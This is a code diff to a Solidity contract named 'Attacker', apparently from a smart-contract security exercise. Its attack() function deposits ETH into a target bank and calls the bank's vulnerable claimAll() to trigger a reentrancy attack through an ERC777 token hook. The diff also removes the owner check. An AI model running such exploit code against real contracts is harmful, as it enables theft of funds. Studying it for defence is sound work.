@@ -46,14 +46,11 @@ contract Attacker is IERC777Recipient {
     /**
      * @dev Executes the attack.
      */
-    function attack(uint256 amount) external payable {
-        require(msg.sender == owner, "Only owner can attack");
-        require(msg.value >= amount, "Insufficient ETH sent");
-
-        // Step 1: Deposit ETH into the bank
-        bank.deposit{value: amount}();
+    function attack(uint256 amt) payable public {
+        // Deposit ETH into the bank
+        bank.deposit{value: msg.value}();
         
-        // Step 2: Call the vulnerable claimAll() function
+        // Call the vulnerable claimAll() function to start the reentrancy attack
         bank.claimAll();
     }
 
@@ -74,7 +71,7 @@ contract Attacker is IERC777Recipient {
             revert("Invalid token");
         }
         
-        // Only re-enter if the sender is the bank (not other users)
+        // Only re-enter if the sender is the bank (minting tokens)
         if (from != address(bank)) {
             return;
         }
